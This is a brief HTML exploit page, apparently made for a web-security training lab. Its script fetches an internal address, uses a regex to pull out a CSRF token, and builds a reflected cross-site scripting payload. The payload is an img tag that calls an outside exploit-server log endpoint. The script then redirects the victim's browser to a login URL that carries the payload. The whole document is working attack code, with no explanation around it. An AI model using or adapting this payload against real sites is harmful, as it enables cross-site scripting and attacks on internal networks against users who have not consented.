<html>
	<script>
		url='https://exploit-0a66002d04da97a380a399b701e00009.exploit-server.net/'
		urlFound='http://192.168.0.195:8080'
		
        fetch(urlFound).then(response => response.text()).then(text =>{ 
				try {
                    xss_vector='"><img src='+url+'/log?key=faille-XSS>';
                    login_path= '/login?username=' + encodeURIComponent(xss_vector)+'&password=random&csrf='+text.match(/csrf" value="([^"]+)"/);
                    location = urlFound + login_path;
				}
				catch(err)
				{
				}		
			})
	
	</script>
</html>